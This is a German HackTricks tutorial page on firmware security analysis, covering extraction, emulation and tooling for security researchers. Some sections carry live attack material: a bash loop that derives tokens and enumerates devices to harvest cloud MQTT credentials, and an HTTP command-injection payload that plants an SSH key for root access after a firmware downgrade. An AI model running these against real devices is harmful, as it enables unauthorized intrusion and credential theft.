# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

## **Einführung**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware ist essentielle Software, die Geräte ordnungsgemäß funktionsfähig macht, indem sie die Kommunikation zwischen Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und ermöglicht. Sie wird in permanentem Speicher abgelegt, wodurch das Gerät bereits beim Einschalten auf wichtige Anweisungen zugreifen kann, die zum Start des Betriebssystems führen. Die Untersuchung und gegebenenfalls Modifikation von Firmware ist ein kritischer Schritt zur Identifizierung von Sicherheitslücken.

## **Informationsbeschaffung**

**Informationsbeschaffung** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Sammeln von Daten zu:

- der CPU-Architektur und dem darauf laufenden Betriebssystem
- Details des Bootloaders
- Hardware-Layout und Datenblätter
- Codebasis-Metriken und Speicherorten des Quellcodes
- externe Bibliotheken und Lizenztypen
- Update-Historie und regulatorische Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Für diesen Zweck sind **open-source intelligence (OSINT)**-Tools äußerst wertvoll, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfprozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analyse, die genutzt werden kann, um potenzielle Probleme zu finden.

## **Beschaffung der Firmware**

Firmware kann auf verschiedene Weisen beschafft werden, die jeweils unterschiedliche Komplexitätsgrade aufweisen:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Bauen** aus den bereitgestellten Anweisungen
- **Herunterladen** von offiziellen Support-Seiten
- Verwendung von **Google dork**-Abfragen, um gehostete Firmware-Dateien zu finden
- Direkter Zugriff auf **cloud storage**, z. B. mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **updates** mittels man-in-the-middle-Techniken
- **Extrahieren** aus dem Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- **Sniffing** nach Update-Anfragen in der Gerätekommunikation
- Identifizieren und Verwenden von **hardcoded update endpoints**
- **Dumping** vom Bootloader oder Netzwerk
- **Entfernen und Auslesen** des Speicherchips, wenn alles andere fehlschlägt, mit geeigneten Hardware-Tools

## Firmware analysieren

Nun, da Sie die **Firmware haben**, müssen Sie Informationen daraus extrahieren, um zu wissen, wie Sie damit umgehen. Verschiedene Tools, die Sie dafür verwenden können:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, überprüfe die Entropie des Images mit `binwalk -E <bin>`; ist die Entropie niedrig, dann ist es wahrscheinlich nicht verschlüsselt. Ist sie hoch, ist es wahrscheinlich verschlüsselt (oder in irgendeiner Form komprimiert).

Außerdem kannst du diese Tools verwenden, um **in der Firmware eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) um die Datei zu inspizieren.

### Dateisystem erhalten

Mit den oben genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, das **Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystem-Typ benannt ist**, der üblicherweise einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystem-Extraktion

Manchmal hat binwalk **nicht das magic byte des Dateisystems in seinen Signaturen**. In diesen Fällen benutze binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem aus dem Binary zu carve** und das Dateisystem entsprechend seinem Typ **manuell zu extrahieren**, indem du die folgenden Schritte befolgst.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd command** aus, um das Squashfs filesystem zu extrahieren.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis `squashfs-root`.

- Für CPIO-Archive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme auf NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu zerlegen, um ihre Struktur und mögliche Schwachstellen zu verstehen. Dieser Prozess umfasst den Einsatz verschiedener Tools, um Daten aus dem Firmware-Image zu analysieren und zu extrahieren.

### Initiale Analyse-Tools

Eine Reihe von Befehlen wird für die erste Inspektion der Binärdatei (bezeichnet als <bin>) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und Informationen zu Partitionen und Dateisystemen zu gewinnen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Geringe Entropie deutet auf fehlende Verschlüsselung hin, während hohe Entropie auf mögliche Verschlüsselung oder Kompression schließen lässt.

Zum Extrahieren **embedded files** werden Tools und Ressourcen wie die **file-data-carving-recovery-tools**-Dokumentation und **binvis.io** zur Dateiansicht empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` kann man in der Regel das Dateisystem extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** jedoch den Dateisystemtyp aufgrund fehlender magischer Bytes nicht erkennt, ist eine manuelle Extraktion notwendig. Dabei verwendet man `binwalk`, um den Offset des Dateisystems zu finden, gefolgt vom `dd`-Befehl, um das Dateisystem auszuschneiden:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Danach, abhängig vom Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs), werden unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Analyse des Dateisystems

Nachdem das Dateisystem extrahiert ist, beginnt die Suche nach Sicherheitslücken. Augenmerk gilt unsicheren Netzwerk-Daemons, hardcodierten Zugangsdaten, API-Endpunkten, Update-Server-Funktionalitäten, nicht kompiliertem Code, Startskripten und kompilierten Binärdateien zur Offline-Analyse.

**Wichtige Orte** und **Elemente**, die zu prüfen sind, umfassen:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Keys in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binärdateien für weitere Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Mehrere Tools helfen dabei, sensible Informationen und Schwachstellen im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Sicherheitsprüfungen an kompilierten Binärdateien

Sowohl Quellcode als auch gefundene kompilierte Binärdateien im Dateisystem müssen auf Schwachstellen überprüft werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Erfassung von Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens

Viele IoT-Hubs holen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt, der wie folgt aussieht:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Während der Firmware-Analyse kann sich herausstellen, dass <token> lokal aus der deviceId unter Verwendung eines hardcodierten Secrets abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, was oft plaintext MQTT-Zugangsdaten und Topic-Präfixe offenlegt.

Praktische Vorgehensweise:

1) deviceId aus UART-Boot-Logs extrahieren

- Verbinden Sie einen 3.3V UART-Adapter (TX/RX/GND) und erfassen Sie die Logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das cloud config URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder nach MD5-Verwendung.
- Bestätige den Algorithmus (z. B., MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und schreibe den Digest in Großbuchstaben:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config und MQTT credentials ernten

- Setze die URL zusammen und hole JSON mit curl; parse es mit jq, um secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Missbrauch von unverschlüsseltem MQTT und schwachen Topic-ACLs (falls vorhanden)

- Verwende wiederhergestellte Zugangsdaten, um Wartungs-Topics zu abonnieren und nach sensiblen Ereignissen zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersehbare Geräte-IDs aufzählen (in großem Maßstab, mit Autorisierung)

- Viele Ökosysteme betten vendor OUI/product/type bytes ein, gefolgt von einem sequentiellen Suffix.
- Sie können Kandidaten-IDs iterieren, Tokens ableiten und Konfigurationen programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Bevor du mass enumeration unternimmst, solltest du immer eine ausdrückliche Genehmigung einholen.
- Bevorzuge emulation oder static analysis, um secrets wiederherzustellen, ohne die target hardware zu verändern, wenn möglich.


Der Prozess des emulating firmware ermöglicht **dynamic analysis** entweder des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Probleme mit hardware- oder architecture-Abhängigkeiten stoßen, aber das Übertragen des root filesystem oder spezifischer binaries auf ein Gerät mit übereinstimmender architecture und endianness, wie z. B. einem Raspberry Pi, oder auf eine vorgefertigte virtual machine, kann weitere Tests erleichtern.

### Emulating Individual Binaries

Zur Untersuchung einzelner Programme ist es entscheidend, die endianness und CPU architecture des Programms zu identifizieren.

#### Beispiel mit MIPS Architecture

Um ein MIPS architecture binary zu emulate, kann man den folgenden Befehl verwenden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulationstools zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Für MIPS (big-endian) wird `qemu-mips` verwendet, und für little-endian Binaries wäre `qemu-mipsel` die Wahl.

#### ARM Architecture Emulation

Für ARM-Binaries ist der Prozess ähnlich, wobei der Emulator `qemu-arm` für die Emulation genutzt wird.

### Full System Emulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere erleichtern die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamic Analysis in Practice

In diesem Stadium wird entweder eine reale oder eine emulierte Geräteumgebung für die Analyse verwendet. Es ist essenziell, Shell-Zugriff auf das OS und das Dateisystem zu behalten. Emulation kann Hardware-Interaktionen nicht perfekt nachbilden, sodass gelegentliche Neustarts der Emulation nötig sind. Die Analyse sollte das Dateisystem erneut durchsuchen, exploit exposed webpages and network services ausnutzen und bootloader vulnerabilities untersuchen. Firmware-Integritätstests sind entscheidend, um mögliche backdoor vulnerabilities zu identifizieren.

## Runtime Analysis Techniques

Runtime-Analyse umfasst die Interaktion mit einem Prozess oder Binary in seiner Laufzeitumgebung und nutzt Tools wie gdb-multiarch, Frida und Ghidra zum Setzen von breakpoints und zur Identifikation von Schwachstellen durch fuzzing und andere Techniken.

## Binary Exploitation and Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in low-level Sprachen. Binary runtime protections in embedded systems sind selten, aber wenn vorhanden, können Techniken wie Return Oriented Programming (ROP) notwendig sein.

## Prepared Operating Systems for Firmware Analysis

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Security-Tests und sind mit den notwendigen Tools ausgestattet.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird **version rollback (downgrade) protection is frequently omitted**. Wenn der boot- oder recovery-loader nur die Signatur mit einem eingebetteten public key prüft, aber nicht die *version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer legitimerweise eine **ältere, verwundbare Firmware installieren, die noch eine gültige Signatur trägt** und so gepatchte Schwachstellen wieder einführen.

Typischer Angriffsablauf:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (herabgestuften) Firmware wird der `md5`-Parameter direkt in einen Shell-Befehl verkettet, ohne bereinigt zu werden, was die Injektion beliebiger Befehle erlaubt (hier – Aktivierung von SSH key-basiertem Root-Zugriff). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, aber das Fehlen eines Downgrade-Schutzes macht die Korrektur wirkungslos.

### Extrahieren von Firmware aus Mobile Apps

Viele Hersteller bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Anwendungen, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete werden üblicherweise unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` abgelegt. Werkzeuge wie `apktool`, `ghidra` oder sogar simples `unzip` ermöglichen es, signierte Images zu extrahieren, ohne die physische Hardware zu berühren.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *update endpoint* ausreichend geschützt (TLS + authentication)?
* Vergleicht das Gerät **version numbers** oder einen **monotonic anti-rollback counter**, bevor es flashed?
* Wird das Image innerhalb einer secure boot chain verifiziert (z. B. signatures checked by ROM code)?
* Führt userland code zusätzliche Plausibilitätsprüfungen durch (z. B. allowed partition map, model number)?
* Nutzen *partial* oder *backup* update flows die gleiche Validierungslogik?

> 💡  Wenn eines der oben genannten fehlt, ist die Plattform wahrscheinlich anfällig für rollback attacks.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, verwende die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Training und Zertifizierung

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
